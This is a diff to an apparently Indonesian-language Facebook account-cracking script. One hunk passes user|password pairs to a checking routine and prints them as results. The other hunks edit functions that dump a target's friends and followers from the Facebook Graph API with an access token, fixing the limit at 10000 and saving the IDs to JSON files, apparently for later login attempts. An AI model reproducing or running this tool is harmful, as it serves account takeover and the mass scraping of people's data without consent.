@@ -553,7 +553,7 @@ def file_lambat(file):
 			ttl = tll
 			print(f"{war}{user}|{pw}|{ttl}")
 			try:
-				form.submit(cek_opsi, user, pw)
+				cek_opsi(user, pw)
 			except:continue
 		except:continue
 #########################
@@ -1252,8 +1252,9 @@ def dump_public():
 		exit(war+"Token Failed !!")
 
 	idt = input(war+"Target ID : ")
-	limit = input(war+"Limit : ")
+#	limit = input(war+"Limit : ")
 	filex = input(war+"Nama File : ")
+	limit = ("10000")
 	try:
 		dump = open('dump/'+filex+'.json','w') 
 		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
@@ -1281,8 +1282,9 @@ def dump_follow():
 		exit(war+"Token Failed !!")
 
 	idt = input(war+"Target ID : ")
-	limit = input(war+"Limit : ")
+#	limit = input(war+"Limit : ")
 	filex = input(war+"Nama File : ")
+	limit = ("10000")
 	try:
 		dump = open('dump/'+filex+'.json','w') 
 		for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
@@ -1310,8 +1312,9 @@ def dump_all():
 		exit(war+"Token Failed !!")
 
 	idt = input(war+"Target ID : ")
-	limit = input(war+"Limit : ")
+#	limit = input(war+"Limit : ")
 	filex = input(war+"Nama File : ")
+	limit = ("10000")
 	try:
 		dump = open('dump/'+filex+'.json','a+') 
 		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
